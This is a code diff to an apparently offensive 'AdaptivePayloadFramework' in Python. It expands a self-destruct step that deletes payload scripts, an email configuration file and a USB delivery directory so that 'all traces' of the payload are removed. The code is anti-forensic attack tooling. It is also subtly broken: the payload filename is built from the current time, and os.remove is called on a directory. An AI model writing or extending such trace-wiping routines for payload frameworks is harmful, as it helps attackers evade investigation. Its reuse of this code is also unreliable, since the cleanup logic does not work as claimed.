@@ -260,14 +260,43 @@ class AdaptivePayloadFramework:
                 print(f"Failed to deliver payload via HTTP: {e}")
 
     # =============================
-    # Step 7: Self-Destruct
+    # Step 7: Self-Destruct (Optional)
     # =============================
     def self_destruct(self):
         """
-        Self-destruct mechanism to remove traces of the payload.
+        Optional self-destruct mechanism to remove traces of the payload and any temporary files.
         """
+        prompt = input("Do you want to enable the self-destruct feature? (yes/no): ").strip().lower()
+        if prompt not in ["yes", "y"]:
+            print("Self-destruct skipped.")
+            return
+
         print("Triggering self-destruct mechanism...")
-        time.sleep(2)
+        
+        # Paths to clean up
+        paths_to_remove = [
+            f"./payloads/manual_payload_{int(time.time())}.sh",  # Example payload file
+            "./.email_config.json",  # Email configuration file (if necessary)
+            "/media/usb/"  # USB directory (if used for payload delivery)
+        ]
+
+        try:
+            # Remove specified files
+            for path in paths_to_remove:
+                if os.path.exists(path):
+                    os.remove(path)
+                    print(f"Removed: {path}")
+            
+            # Optionally remove leftover directories (e.g., USB directories)
+            usb_path = "/media/usb/"
+            if os.path.exists(usb_path) and os.path.isdir(usb_path):
+                os.rmdir(usb_path)  # Remove directory if empty
+                print(f"Removed USB directory: {usb_path}")
+
+            print("All traces removed successfully.")
+        except Exception as e:
+            print(f"Error during self-destruct: {e}")
+        
         print("Payload self-destructed.")
 
     # =============================
